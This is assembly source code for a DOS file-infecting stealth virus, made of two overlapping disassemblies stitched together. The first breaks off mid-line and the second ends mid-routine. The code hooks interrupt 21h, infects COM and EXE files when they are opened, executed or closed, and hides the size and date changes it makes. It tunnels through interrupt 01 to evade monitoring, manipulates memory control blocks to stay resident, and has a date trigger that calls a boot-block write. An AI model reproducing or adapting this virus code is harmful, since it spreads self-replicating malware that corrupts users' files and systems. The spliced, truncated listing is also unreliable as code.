exitint21:
                call    saveregs
                call    restoreBREAK
                call    swapvirint21
                call    restoreregs
                pop     bp
                push    bp                      ; set up stack frame
                mov     bp,sp
                push    word ptr cs:int21flags  ; get the flags and put
                pop     word ptr [bp+6]         ; them on the stack for
                pop     bp                      ; the iret
                iret

FCBfindfirstnext:
                call    _popall
                call    callint21
                or      al,al                   ; Found any files?
                jnz     exitint21               ; guess not
                call    _pushall
                call    getdisktransferaddress
                mov     al,0
                cmp     byte ptr [bx],0FFh      ; Extended FCB?
                jne     findfirstnextnoextendedFCB
                mov     al,[bx+6]
                add     bx,7                    ; convert to normal FCB
findfirstnextnoextendedFCB:
                and     cs:hide_size,al
                test    byte ptr [bx+1Ah],80h   ; check year bit for virus
                jz      _popall_then_exitint21  ; infection tag. exit if so
                sub     byte ptr [bx+1Ah],0C8h  ; alter file date
                cmp     byte ptr cs:hide_size,0
                jne     _popall_then_exitint21
                sub     word ptr [bx+1Dh],1000h ; hide file size
                sbb     word ptr [bx+1Fh],0
_popall_then_exitint21:
                call    _popall
                jmp     short exitint21

FCBopenfile:
                call    _popall
                call    callint21               ; chain to original int 21h
                call    _pushall
                or      al,al                   ; 0 = success
                jnz     _popall_then_exitint21
                mov     bx,dx
                test    byte ptr [bx+15h],80h   ; check if infected yet
                jz      _popall_then_exitint21
                sub     byte ptr [bx+15h],0C8h  ; restore date
                sub     word ptr [bx+10h],1000h ; and hide file size
                sbb     byte ptr [bx+12h],0
                jmp     short _popall_then_exitint21

randomFCBblockread:
                jcxz    go_exitotherint21       ; reading any blocks?

randomFCBread:
                mov     bx,dx
                mov     si,[bx+21h]             ; check if reading first
                or      si,[bx+23h]             ; bytes
                jnz     go_exitotherint21
                jmp     short continueFCBread

sequentialFCBread:
                mov     bx,dx
                mov     ax,[bx+0Ch]             ; check if reading first
                or      al,[bx+20h]             ; bytes
                jnz     go_exitotherint21
continueFCBread:
                call    checkFCBokinfect
                jnc     continuecontinueFCBread
go_exitotherint21:
                jmp     exitotherint21
continuecontinueFCBread:
                call    _popall
                call    _pushall
                call    callint21               ; chain to original handler
                mov     [bp-4],ax               ; set the return codes
                mov     [bp-8],cx               ; properly
                push    ds                      ; save FCB pointer
                push    dx
                call    getdisktransferaddress
                cmp     word ptr [bx+14h],1     ; check for EXE infection
                je      FCBreadinfectedfile     ; (IP = 1)
                mov     ax,[bx]                 ; check for COM infection
                add     ax,[bx+2]               ; (checksum = 0)
                add     ax,[bx+4]
                jz      FCBreadinfectedfile
                add     sp,4                    ; no infection, no stealth
                jmp     short _popall_then_exitint21 ; needed
FCBreadinfectedfile:
                pop     dx                      ; restore address of the FCB
                pop     ds
                mov     si,dx
                push    cs
                pop     es
                mov     di,offset tempFCB       ; copy FCB to temporary one
                mov     cx,25h
                rep     movsb
                mov     di,offset tempFCB
                push    cs
                pop     ds
                mov     ax,[di+10h]             ; get old file size
                mov     dx,[di+12h]
                add     ax,100Fh                ; increase by virus size
                adc     dx,0                    ; and round to the nearest
                and     ax,0FFF0h               ; paragraph
                mov     [di+10h],ax             ; insert new file size
                mov     [di+12h],dx
                sub     ax,0FFCh
                sbb     dx,0
                mov     [di+21h],ax             ; set new random record #
                mov     [di+23h],dx
                mov     word ptr [di+0Eh],1     ; record size = 1
                mov     cx,1Ch
                mov     dx,di
                mov     ah,27h                  ; random block read 1Ch bytes
                call    callint21
                jmp     _popall_then_exitint21

FCBgetfilesize:
                push    cs
                pop     es
                mov     si,dx
                mov     di,offset tempFCB       ; copy FCB to temp buffer
                mov     cx,0025h
                repz    movsb
                push    ds
                push    dx
                push    cs
                pop     ds
                mov     dx,offset tempFCB
                mov     ah,0Fh                  ; FCB open file
                call    callint21
                mov     ah,10h                  ; FCB close file
                call    callint21
                test    byte ptr [tempFCB+15h],80h ; check date bit
                pop     si
                pop     ds
                jz      will_exitotherint21     ; exit if not infected
                les     bx,dword ptr cs:[tempFCB+10h] ; get filesize
                mov     ax,es
                sub     bx,1000h                ; hide increase
                sbb     ax,0
                xor     dx,dx
                mov     cx,word ptr cs:[tempFCB+0eh] ; get record size
                dec     cx
                add     bx,cx
                adc     ax,0
                inc     cx
                div     cx
                mov     [si+23h],ax             ; fix random access record #
                xchg    dx,ax
                xchg    bx,ax
                div     cx
                mov     [si+21h],ax             ; fix random access record #
                jmp     _popall_then_exitint21

filenamefindfirstnext:
                and     word ptr cs:int21flags,-2 ; turn off trap flag
                call    _popall
                call    callint21
                call    _pushall
                jnb     filenamefffnOK          ; continue if a file is found
                or      word ptr cs:int21flags,1
                jmp     _popall_then_exitint21

filenamefffnOK:
                call    getdisktransferaddress
                test    byte ptr [bx+19h],80h   ; Check high bit of date
                jnz     filenamefffnfileinfected; Bit set if infected
                jmp     _popall_then_exitint21
filenamefffnfileinfected:
                sub     word ptr [bx+1Ah],1000h ; hide file length increase
                sbb     word ptr [bx+1Ch],0
                sub     byte ptr [bx+19h],0C8h  ; and date change
                jmp     _popall_then_exitint21

createhandle:
                push    cx
                and     cx,7                    ; mask the attributes
                cmp     cx,7                    ; r/o, hidden, & system?
                je      exit_create_handle
                pop     cx
                call    replaceint13and24
                call    callint21               ; chain to original int 21h
                call    restoreint13and24
                pushf
                cmp     byte ptr cs:errorflag,0 ; check if any errors yet
                je      no_errors_createhandle
                popf
will_exitotherint21:
                jmp     exitotherint21
no_errors_createhandle:
                popf
                jc      other_error_createhandle; exit on error
                mov     bx,ax                   ; move handle to bx
                mov     ah,3Eh                  ; Close file
                call    callint21
                jmp     short openhandle
other_error_createhandle:
                or      byte ptr cs:int21flags,1; turn on the trap flag
                mov     [bp-4],ax               ; set the return code properly
                jmp     _popall_then_exitint21
exit_create_handle:
                pop     cx
                jmp     exitotherint21

openhandle:
                call    getcurrentPSP
                call    checkdsdxokinfect
                jc      jmp_exitotherint21
                cmp     byte ptr cs:handlesleft,0 ; make sure there is a free
                je      jmp_exitotherint21        ; entry in the table
                call    setup_infection         ; open the file
                cmp     bx,0FFFFh               ; error?
                je      jmp_exitotherint21      ; if so, exit
                dec     byte ptr cs:handlesleft
                push    cs
                pop     es
                mov     di,offset handletable
                mov     cx,14h
                xor     ax,ax                   ; find end of the table
                repne   scasw
                mov     ax,cs:currentPSP        ; put the PSP value and the
                mov     es:[di-2],ax            ; handle # in the table
                mov     es:[di+26h],bx
                mov     [bp-4],bx               ; put handle # in return code
handleopenclose_exit:
                and     byte ptr cs:int21flags,0FEh ; turn off the trap flag
                jmp     _popall_then_exitint21
jmp_exitotherint21:
                jmp     exitotherint21

handleclosefile:
                push    cs
                pop     es
                call    getcurrentPSP
                mov     di,offset handletable
                mov     cx,14h                  ; 14h entries max
                mov     ax,cs:currentPSP        ; search for calling PSP
scanhandle_close:
                repne   scasw
                jnz     handlenotfound          ; handle not trapped
                cmp     bx,es:[di+26h]          ; does the handle correspond?
                jne     scanhandle_close        ; if not, find another handle
                mov     word ptr es:[di-2],0    ; otherwise, clear handle
                call    infect_file
                inc     byte ptr cs:handlesleft ; fix handles left counter
                jmp     short handleopenclose_exit ; and exit
handlenotfound:
                jmp     exitotherint21

getdisktransferaddress:
                push    es
                mov     ah,2Fh                  ; Get disk transfer address
                call    callint21               ; to es:bx
                push    es
                pop     ds                      ; mov to ds:bx
                pop     es
                retn
execute:
                or      al,al                   ; load and execute?
                jz      loadexecute             ; yepper!
                jmp     checkloadnoexecute      ; otherwise check if
                                                ; load/no execute
loadexecute:
                push    ds                      ; save filename
                push    dx
                mov     word ptr cs:parmblock,bx; save parameter block and
                mov     word ptr cs:parmblock+2,es; move to ds:si
                lds     si,dword ptr cs:parmblock
                mov     di,offset copyparmblock ; copy the parameter block
                mov     cx,0Eh
                push    cs
                pop     es
                rep     movsb
                pop     si                      ; copy the filename
                pop     ds                      ; to the buffer
                mov     di,offset copyfilename
                mov     cx,50h
                rep     movsb
                mov     bx,0FFFFh
                call    allocate_memory         ; allocate available memory
                call    _popall
                pop     bp                      ; save the parameters
                pop     word ptr cs:saveoffset  ; on the stack
                pop     word ptr cs:savesegment
                pop     word ptr cs:int21flags
                mov     ax,4B01h                ; load/no execute
                push    cs                      ; ds:dx -> file name
                pop     es                      ; es:bx -> parameter block
                mov     bx,offset copyparmblock
                pushf                           ; perform interrupt 21h
                call    dword ptr cs:oldint21
                jnc     continue_loadexecute    ; continue if no error
                or      word ptr cs:int21flags,1; turn on trap flag
                push    word ptr cs:int21flags  ; if error
                push    word ptr cs:savesegment ; restore stack
                push    word ptr cs:saveoffset
                push    bp                      ; restore the stack frame
                mov     bp,sp                   ; and restore ES:BX to
                les     bx,dword ptr cs:parmblock ; point to the parameter
                jmp     exitint21               ; block
continue_loadexecute:
                call    getcurrentPSP
                push    cs
                pop     es
                mov     di,offset handletable   ; scan the handle table
                mov     cx,14h                  ; for the current PSP's
scanhandle_loadexecute:                         ; handles
                mov     ax,cs:currentPSP
                repne   scasw
                jnz     loadexecute_checkEXE
                mov     word ptr es:[di-2],0    ; clear entry in handle table
                inc     byte ptr cs:handlesleft ; fix handlesleft counter
                jmp     short scanhandle_loadexecute
loadexecute_checkEXE:
                lds     si,dword ptr cs:origcsip
                cmp     si,1                    ; Check if EXE infected
                jne     loadexecute_checkCOM
                mov     dx,word ptr ds:oldheader+16h ; get initial CS
                add     dx,10h                  ; adjust for PSP
                mov     ah,51h                  ; Get current PSP segment
                call    callint21
                add     dx,bx                   ;adjust for start load segment
                mov     word ptr cs:origcsip+2,dx
                push    word ptr ds:oldheader+14h       ; save old IP
                pop     word ptr cs:origcsip
                add     bx,10h                          ; adjust for the PSP
                add     bx,word ptr ds:oldheader+0Eh    ; add old SS
                mov     cs:origss,bx
                push    word ptr ds:oldheader+10h       ; old SP
                pop     word ptr cs:origsp
                jmp     short perform_loadexecute
loadexecute_checkCOM:
                mov     ax,[si]                 ; Check if COM infected
                add     ax,[si+2]
                add     ax,[si+4]
                jz      loadexecute_doCOM       ; exit if already infected
                push    cs                      ; otherwise check to see
                pop     ds                      ; if it is suitable for
                mov     dx,offset copyfilename  ; infection
                call    checkdsdxokinfect
                call    setup_infection
                inc     byte ptr cs:hideclustercountchange
                call    infect_file             ; infect the file
                dec     byte ptr cs:hideclustercountchange
perform_loadexecute:
                mov     ah,51h                  ; Get current PSP segment
                call    callint21
                call    saveregs
                call    restoreBREAK
                call    swapvirint21
                call    restoreregs
                mov     ds,bx                   ; ds = current PSP segment
                mov     es,bx                   ; es = current PSP segment
                push    word ptr cs:int21flags  ; restore stack parameters
                push    word ptr cs:savesegment
                push    word ptr cs:saveoffset
                pop     word ptr ds:[0Ah]       ; Set terminate address in PSP
                pop     word ptr ds:[0Ch]       ; to return address found on
                                                ; the stack
                                                ; (int 21h caller CS:IP)
                push    ds
                lds     dx,dword ptr ds:[0Ah]   ; Get terminate address in PSP
                mov     al,22h                  ; Set terminate address to it
                call    setvect
                pop     ds
                popf
                pop     ax
                mov     ss,cs:origss            ; restore the stack
                mov     sp,cs:origsp            ; and
                jmp     dword ptr cs:origcsip   ; perform the execute

loadexecute_doCOM:
                mov     bx,[si+1]               ; restore original COM file
                mov     ax,word ptr ds:[bx+si-261h]
                mov     [si],ax
                mov     ax,word ptr ds:[bx+si-25Fh]
                mov     [si+2],ax
                mov     ax,word ptr ds:[bx+si-25Dh]
                mov     [si+4],ax
                jmp     short perform_loadexecute
checkloadnoexecute:
                cmp     al,1
                je      loadnoexecute
                jmp     exitotherint21
loadnoexecute:
                or      word ptr cs:int21flags,1; turn on trap flag
                mov     word ptr cs:parmblock,bx; save pointer to parameter
                mov     word ptr cs:parmblock+2,es ; block
                call    _popall
                call    callint21               ; chain to int 21h
                call    _pushall
                les     bx,dword ptr cs:parmblock ; restore pointer to
                                                ; parameter block
                lds     si,dword ptr es:[bx+12h]; get cs:ip on execute return
                jc      exit_loadnoexecute
                and     byte ptr cs:int21flags,0FEh ; turn off trap flag
                cmp     si,1                    ; check for EXE infection
                je      loadnoexecute_EXE_already_infected
                                                ; infected if initial IP = 1
                mov     ax,[si]                 ; check for COM infection
                add     ax,[si+2]               ; infected if checksum = 0
                add     ax,[si+4]
                jnz     perform_the_execute
                mov     bx,[si+1]               ; get jmp location
                mov     ax,ds:[bx+si-261h]      ; restore original COM file
                mov     [si],ax
                mov     ax,ds:[bx+si-25Fh]
                mov     [si+2],ax
                mov     ax,ds:[bx+si-25Dh]
                mov     [si+4],ax
                jmp     short perform_the_execute
loadnoexecute_EXE_already_infected:
                mov     dx,word ptr ds:oldheader+16h ; get entry CS:IP
                call    getcurrentPSP
                mov     cx,cs:currentPSP
                add     cx,10h                  ; adjust for PSP
                add     dx,cx
                mov     es:[bx+14h],dx          ; alter the entry point CS
                mov     ax,word ptr ds:oldheader+14h
                mov     es:[bx+12h],ax
                mov     ax,word ptr ds:oldheader+0Eh ; alter stack
                add     ax,cx
                mov     es:[bx+10h],ax
                mov     ax,word ptr ds:oldheader+10h
                mov     es:[bx+0Eh],ax
perform_the_execute:
                call    getcurrentPSP
                mov     ds,cs:currentPSP
                mov     ax,[bp+2]               ; restore length as held in
                mov     word ptr ds:oldheader+6,ax
                mov     ax,[bp+4]               ; the EXE header
                mov     word ptr ds:oldheader+8,ax
exit_loadnoexecute:
                jmp     _popall_then_exitint21

getDOSversion:
                mov     byte ptr cs:hide_size,0
                mov     ah,2Ah                  ; Get date
                call    callint21
                cmp     dx,916h                 ; September 22?
                jb      exitDOSversion          ; leave if not
                call    writebootblock          ; this is broken
exitDOSversion:
                jmp     exitotherint21

infect_file:
                call    replaceint13and24
                call    findnextparagraphboundary
                mov     byte ptr ds:EXEflag,1   ; assume is an EXE file
                cmp     word ptr ds:readbuffer,'ZM' ; check here for regular
                je      clearlyisanEXE              ; EXE header
                cmp     word ptr ds:readbuffer,'MZ' ; check here for alternate
                je      clearlyisanEXE              ; EXE header
                dec     byte ptr ds:EXEflag         ; if neither, assume is a
                jz      try_infect_com              ; COM file
clearlyisanEXE:
                mov     ax,ds:lengthinpages     ; get file size in pages
                shl     cx,1                    ; and convert it to
                mul     cx                      ; bytes
                add     ax,200h                 ; add 512 bytes
                cmp     ax,si
                jb      go_exit_infect_file
                mov     ax,ds:minmemory         ; make sure min and max memory
                or      ax,ds:maxmemory         ; are not both zero
                jz      go_exit_infect_file
                mov     ax,ds:filesizelow       ; get filesize in dx:ax
                mov     dx,ds:filesizehigh
                mov     cx,200h                 ; convert to pages
                div     cx
                or      dx,dx                   ; filesize multiple of 512?
                jz      filesizemultiple512     ; then don't increm

;;;;;;;;;;;;;;;;;;;;;;;;

PSP_0A          equ     0Ah                     ; (0000:000A=0)
MCB_0000        equ     0                       ; (7DBC:0000=E9)
MCB_0001        equ     1                       ; (7DBC:0001=275h)
MCB_0003        equ     3                       ; (7DBC:0003=1503h)
all_len         equ     1600h
jmp_len         equ     3
sav_file        equ     data_23 - virus_entry + jmp_len

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a

                org     0

                db       00h

                jmp     vir_1
data_23         dw      20CDh           ; old file
data_24         dw      0               ; (first 6 bytes)
data_25         dw      0               ; - check sum
                db      0,0,0,0,0,0,0,0
data_27         dw      0               ; + 0eh = original SS:
data_28         dw      0               ; + 10h = original SP
                dw      0
data_29         dd      0               ; + 14h = .EXE file entry point
                db      0,0,0,0
data_31         db      0               ; flag : 1-EXE, 0-COM
data_32         db      0FEh
                db       3Ah
debug:          push    bp              ;address is 0023
                mov     bp,sp
                push    ax
                cmp     [bp+4],0C000h
                jae     loc_1_1         ; segment > C000
                mov     ax,cs:data_68
                cmp     [bp+4],ax
                jna     loc_1_1
loc_1:          pop     ax
                pop     bp
                iret                            ; Interrupt return
loc_1_1:        cmp     byte ptr cs:data_73,1   ; (CS:1250=0)
                je      loc_3                   ; Jump if equal
                mov     ax,[bp+4]
                mov     word ptr cs:old_INT+2,ax  ; (CS:122F=70h)
                mov     ax,[bp+2]
                mov     word ptr cs:old_INT,ax    ; (CS:122D=0)
                jc      loc_2                   ; Jump if carry Set
                pop     ax
                pop     bp
                mov     ss,cs:data_92           ; (CS:12DD=151Ch)
                mov     sp,cs:data_93           ; (CS:12DF=0)
                mov     al,cs:data_97           ; (CS:12E5=0)
                out     21h,al                  ; port 21h, 8259-1 int comands
                jmp     loc_79                  ; (0D40)
loc_2:
                and     word ptr [bp+6],0FEFFh
                mov     al,cs:data_97           ; (CS:12E5=0)
                out     21h,al                  ; port 21h, 8259-1 int comands
                jmp     short loc_1             ; (0037)
loc_3:
                dec     cs:data_74              ; (CS:1251=0)
                jnz     loc_1                   ; Jump if not zero
                and     word ptr [bp+6],0FEFFh
                call    sub_21                  ; Save REGS in vir's stack
                call    sub_18                  ; (0DBA)
                lds     dx,cs:old_INT_1         ; (CS:1231=0) Load 32 bit ptr
                mov     al,1
                call    sub_27                  ; Set INT 01 vector
                call    sub_20                  ; Restore regs from vir's stack
                jmp     short loc_2             ; (0067)


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_1           proc    near
                push    ds
                push    si
                xor     si,si                   ; Zero register
                mov     ds,si
                xor     ah,ah                   ; Zero register
                mov     si,ax
                shl     si,1                    ; Shift w/zeros fill
                shl     si,1                    ; Shift w/zeros fill
                mov     bx,[si]
                mov     es,[si+2]
                pop     si
                pop     ds
                retn
sub_1           endp

vir_1:          mov     cs:data_113,1600h       ; (CS:135B=0)
                mov     cs:old_AX,ax            ; (CS:12E3=0)
                mov     ah,30h
                int     21h                     ; DOS Services  ah=function 30h
                                                ;  get DOS version number ax
                mov     cs:dos_ver,al           ; (CS:12EE=0)
                mov     cs:old_DS,ds            ; (CS:1245=7DBDh)
                mov     ah,52h
                int     21h                     ; DOS Services  ah=function 52h
                                                ;  get DOS data table ptr es:bx
                mov     ax,es:[bx-2]
                mov     cs:data_68,ax           ; (CS:1247=0)
                mov     es,ax
                mov     ax,es:[1]               ; (5200:0001=0FFFFh)
                mov     cs:data_69,ax           ; (CS:1249=0)
                push    cs
                pop     ds
                mov     al,1
                call    sub_1                   ; Get INT 01 vector
                mov     word ptr old_INT_1,bx   ; (CS:1231=0)
                mov     word ptr old_INT_1+2,es ; (CS:1233=70h)
                mov     al,21h
                call    sub_1                   ; Get INT 21 vector
                mov     word ptr old_INT,bx     ; (CS:122D=0)
                mov     word ptr old_INT+2,es   ; (CS:122F=70h)
                mov     byte ptr data_73,0      ; (CS:1250=0)
                mov     dx,offset debug
                mov     al,1
                call    sub_27                  ; Set INT 01 vector
                pushf                           ; Push flags
                pop     ax
                or      ax,100h
                push    ax
                in      al,21h                  ; port 21h, 8259-1 int IMR
                mov     data_97,al              ; (CS:12E5)
                mov     al,0FFh
                out     21h,al                  ; port 21h, 8259-1 int comands
                popf                            ; Pop flags
                mov     ah,52h
                pushf                           ; Push flags
                call    dword ptr old_INT       ; (CS:122D)
                pushf                           ; Push flags
                pop     ax
                and     ax,0FEFFh
                push    ax
                popf                            ; Pop flags
                mov     al,data_97              ; (CS:12E5=0)
                out     21h,al                  ; port 21h, 8259-1 int comands
                push    ds
                lds     dx,old_INT_1            ; (CS:1231=0) Load 32 bit ptr
                mov     al,1
                call    sub_27                  ; Set INT 01 vector
                pop     ds
                les     di,old_INT              ; (CS:122D=0) Load 32 bit ptr
                mov     word ptr ptr_INT_21,di   ; (CS:1235=0)
                mov     word ptr ptr_INT_21+2,es ; (CS:1237=70h)
                mov     byte ptr data_70,0EAh   ; (CS:124B=0)
                mov     data_71,offset INT_21   ; (CS:124C=0) (02CC)
                mov     data_72,cs              ; (CS:124E=7DBDh)
                call    sub_18                  ; (0DBA)
                mov     ax,4B00h
                mov     data_95,ah              ; (CS:12E2=0)
                mov     dx,offset data_32       ; (CS:0021=0FEh)
                push    word ptr data_31        ; (CS:0020=0FE00h)
                int     21h                     ; DOS Services  ah=function 4Bh
                                                ;  run progm @ds:dx, parm @es:bx
                pop     word ptr data_31        ; (CS:0020=0FE00h)
                add     word ptr es:[di-4],9
                nop
                mov     es,old_DS               ; (CS:1245)
                mov     ds,old_DS               ; (CS:1245)
                sub     word ptr ds:[2],161h    ; decrement mem size
                mov     bp,word ptr ds:[2]      ; mem size
                mov     dx,ds
                sub     bp,dx
                mov     ah,4Ah
                mov     bx,0FFFFh
                int     21h                     ; DOS Services  ah=function 4Ah
                                                ;  change mem allocation, bx=siz
                mov     ah,4Ah
                int     21h                     ; DOS Services  ah=function 4Ah
                                                ;  change mem allocation, bx=siz
                dec     dx
                mov     ds,dx
                cmp     byte ptr ds:[MCB_0000],5Ah ; (7DBC:0000=0E9h) 'Z'
                je      loc_4                   ; Jump if equal
                dec     cs:data_95              ; (CS:12E2=0)
loc_4:
                cmp     byte ptr cs:data_95,0   ; (CS:12E2=0)
                je      loc_5                   ; Jump if equal
                mov     byte ptr ds:[MCB_0000],4Dh ; (7DBC:0000=0E9h) 'M'
loc_5:
                mov     ax,ds:MCB_0003          ; (7DBC:0003=1503h)
                mov     bx,ax
                sub     ax,161h
                add     dx,ax
                mov     ds:MCB_0003,ax          ; (7DBC:0003=1503h)
                inc     dx
                mov     es,dx
                mov     byte ptr es:MCB_0000,5Ah        ; (915F:0000=0) 'Z'
                push    cs:data_69                      ; (CS:1249=0)
                pop     word ptr es:MCB_0001            ; (915F:0001=0)
                mov     word ptr es:MCB_0003,160h       ; (915F:0003=0)
                inc     dx
                mov     es,dx
                push    cs
                pop     ds
                mov     cx,all_len/2
                mov     si,all_len-2            ; (CS:15FE=0)
                mov     di,si
                std                             ; Set direction flag
                rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
                cld                             ; Clear direction
                push    es
                mov     ax,offset loc_1EE
                push    ax
                mov     es,cs:old_DS            ; (CS:1245=7DBDh)
                mov     ah,4Ah                  ; 'J'
                mov     bx,bp
                int     21h                     ; DOS Services  ah=function 4Ah
                                                ;  change mem allocation, bx=siz
                retf                            ; Return far - jump to loc_1EE
loc_1EE:        call    sub_18                  ; (0DBA)
                mov     cs:data_72,cs           ; (CS:124E=7DBDh)
                call    sub_18                  ; (0DBA)
                push    cs
                pop     ds
                mov     byte ptr data_76,14h    ; (CS:12A2=0)
                push    cs
                pop     es
                mov     di,offset data_75       ; (CS:1252=0)
                mov     cx,14h
                xor     ax,ax                   ; Zero register
                rep     stosw                   ; Rep when cx >0 Store ax to es:[di]
                mov     data_103,al             ; (CS:12EF=0)
                mov     ax,old_DS               ; (CS:1245=7DBDh)
                mov     es,ax
                lds     dx,es:[0Ah]             ; from offset 000A in PSP Load 32 bit ptr
                mov     ds,ax
                add     ax,10h
                add     word ptr cs:data_29+2,ax ; (CS:001A=1ED5h)
                cmp     byte ptr cs:data_31,0    ; (CS:0020=0)
                jne     loc_6                   ; Jump if not equal
; restore infected .COM file and run it
                sti                             ; Enable interrupts
                mov     ax,cs:data_23           ; (CS:0004=20CDh)
                mov     word ptr ds:[100h],ax   ; (CS:0100=0E9Ah)
                mov     ax,cs:data_24           ; (CS:0006=340h)
                mov     word ptr ds:[102h],ax   ; (CS:0102=589Ch)
                mov     ax,cs:data_25           ; (CS:0008=50C6h)
                mov     word ptr ds:[104h],ax   ; (CS:0104=0Dh)
                push    cs:old_DS               ; (CS:1245=7DBDh)
                mov     ax,100h
                push    ax
                mov     ax,cs:old_AX            ; (CS:12E3=0)
                retf                            ; Return far
loc_6:
; restore infected .EXE file and run it
                add     cs:data_27,ax           ; (CS:0012=68Ch)
                mov     ax,cs:old_AX            ; (CS:12E3=0)
                mov     ss,cs:data_27           ; (CS:0012=68Ch)
                mov     sp,cs:data_28           ; (CS:0014) original SP
                sti                             ; Enable interrupts
                jmp     cs:data_29              ; (CS:0018=12Bh)
virus_entry:    cmp     sp,100h
                ja      loc_7                   ; Jump if above
                xor     sp,sp                   ; Zero register
loc_7:
                mov     bp,ax
                call    sub_2                   ; (0275)
sub_2:          pop     cx
                sub     cx,offset sub_2
                mov     ax,cs
                mov     bx,10h
                mul     bx                      ; dx:ax = ax * 10
                add     ax,cx                   ; cx = virus begin address
                adc     dx,0
                div     bx                      ; ax,dx rem=dx:ax/10
                push    ax                      ; ax = new segment
                mov     ax,offset vir_1
                push    ax
                mov     ax,bp
                retf                            ; Return far - jump to vir_1

table_          db       30h
                dw      offset _21_30
                db       23h
                dw      offset _21_23
                db       37h
                dw      offset _21_37
                db       4bh
                dw      offset _21_4B
                db       3ch
                dw      offset _21_3C
                db       3dh
                dw      offset _21_3D
                db       3Eh
                dw      offset _21_3E
                db       0Fh
                dw      offset _21_0F
                db       14h
                dw      offset _21_14
                db       21h
                dw      offset _21_21
                db       27h
                dw      offset _21_27
                db       11h
                dw      offset _21_11_12
                db       12h
                dw      offset _21_11_12
                db       4Eh
                dw      offset _21_4E_4F
                db       4Fh
                dw      offset _21_4E_4F
                db       3Fh
                dw      offset _21_3F
                db       40h
                dw      offset _21_40
                db       42h
                dw      offset _21_42
                db       57h
                dw      offset _21_57
                db       48h
                dw      offset _21_48
end_tbl:
INT_21:         cmp     ax,4b00h
                jnz     loc_8_1
                mov     cs:data_95,al
loc_8_1:        push    bp
                mov     bp,sp
                push    [bp+6]                  ; flags
                pop     cs:data_85
                pop     bp                      ;  ???
                push    bp                      ;  ???
                mov     bp,sp
                call    sub_21                  ; Save REGS in vir's stack
                call    sub_18                  ; xchg info in INT 21
                call    sub_15                  ; BREAK = OFF
                call    sub_20                  ; Restore regs from vir's stack
                call    sub_17                  ; Save REGS
                push    bx
                mov     bx,offset table_
loc_8:
                cmp     ah,cs:[bx]
                jne     loc_9                   ; Jump if not equal
                mov     bx,cs:[bx+1]
                xchg    bx,[bp-14h]
                cld                             ; Clear direction
                retn
loc_9:
                add     bx,3
                cmp     bx,offset end_tbl
                jb      loc_8                   ; Jump if below
                pop     bx
loc_10:
                call    sub_16                  ; Restore BREAK state
                in      al,21h                  ; port 21h, 8259-1 int IMR
                mov     cs:data_97,al           ; (CS:12E5=0)
                mov     al,0FFh
                out     21h,al                  ; port 21h, 8259-1 int comands
                mov     byte ptr cs:data_74,4   ; (CS:1251=0)
                mov     byte ptr cs:data_73,1   ; (CS:1250=0)
                call    sub_22                  ; Set INT 01 for debuging
                call    sub_19                  ; Restore REGS
                push    ax
                mov     ax,cs:data_85           ; (CS:12B3=0)
                or      ax,100h
                push    ax
                popf                            ; Pop flags
                pop     ax
                pop     bp
                jmp     dword ptr cs:ptr_INT_21 ; (CS:1235=0)
loc_11:
                call    sub_21                  ; Save REGS in vir's stack
                call    sub_16                  ; (0D9B)
                call    sub_18                  ; (0DBA)
                call    sub_20                  ; Restore regs from vir's stack
                pop     bp
                push    bp
                mov     bp,sp
                push    cs:data_85              ; (CS:12B3=0)
                pop     word ptr [bp+6]
                pop     bp
                iret                            ; Interrupt return
_21_11_12:      call    sub_19                  ; Restore REGS
                call    sub_24                  ; INT 21
                or      al,al                   ; Zero ?
                jnz     loc_11                  ; Jump if not zero
                call    sub_17                  ; Save REGS
                call    sub_3                   ; (0581)
                mov     al,0
                cmp     byte ptr [bx],0FFh
                jne     loc_12                  ; Jump if not equal
                mov     al,[bx+6]
                add     bx,7
loc_12:
                and     cs:data_104,al          ; (CS:12F0=0)
                test    byte ptr [bx+1Ah],80h
                jz      loc_13                  ; Jump if zero
                sub     byte ptr [bx+1Ah],0C8h
                cmp     byte ptr cs:data_104,0  ; (CS:12F0=0)
                jne     loc_13                  ; Jump if not equal
                sub     word ptr [bx+1Dh],1000h
                sbb     word ptr [bx+1Fh],0
loc_13:
                call    sub_19                  ; Restore REGS
                jmp     short loc_11            ; (033F)
_21_0F:         call    sub_19                  ; Restore REGS
                call    sub_24                  ; INT 21
                call    sub_17                  ; Save REGS
                or      al,al                   ; Zero ?
                jnz     loc_13                  ; Jump if not zero
                mov     bx,dx
                test    byte ptr [bx+15h],80h
                jz      loc_13                  ; Jump if zero
                sub     byte ptr [bx+15h],0C8h
                sub     word ptr [bx+10h],1000h
                sbb     byte ptr [bx+12h],0
                jmp     short loc_13            ; (0396)
_21_27:         jcxz    loc_15                  ; Jump if cx=0
_21_21:         mov     bx,dx
                mov     si,[bx+21h]
                or      si,[bx+23h]
                jnz     loc_15                  ; Jump if not zero
                jmp     short loc_14            ; (03D7)
_21_14:         mov     bx,dx
                mov     ax,[bx+0Ch]
                or      al,[bx+20h]
                jnz     loc_15                  ; Jump if not zero
loc_14:
                call    sub_7                   ; (0919)
                jnc     loc_16                  ; Jump if carry=0
loc_15:
                jmp     loc_10                  ; (030F)
loc_16:
                call    sub_19                  ; Restore REGS
                call    sub_17                  ; Save REGS
                call    sub_24                  ; INT 21
                mov     [bp-4],ax
                mov     [bp-8],cx
                push    ds
                push    dx
                call    sub_3                   ; (0581)
                cmp     word ptr [bx+14h],1
                je      loc_17                  ; Jump if equal
                mov     ax,[bx]
                add     ax,[bx+2]
                add     ax,[bx+4]
                jz      loc_17                  ; Jump if zero
                add     sp,4
                jmp     short loc_13            ; (0396)
loc_17:
                pop     dx
                pop     ds
                mov     si,dx
                push    cs
                pop     es
                mov     di,offset data_86       ; (CS:12B5=0)
                mov     cx,25h
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                mov     di,offset data_86       ; (CS:12B5=0)
                push    cs
                pop     ds
                mov     ax,[di+10h]
                mov     dx,[di+12h]
                add     ax,100Fh
                adc     dx,0
                and     ax,0FFF0h
                mov     [di+10h],ax
                mov     [di+12h],dx
                sub     ax,0FFCh
                sbb     dx,0
                mov     [di+21h],ax
                mov     [di+23h],dx
                mov     word ptr [di+0Eh],1
                mov     cx,1Ch
                mov     dx,di
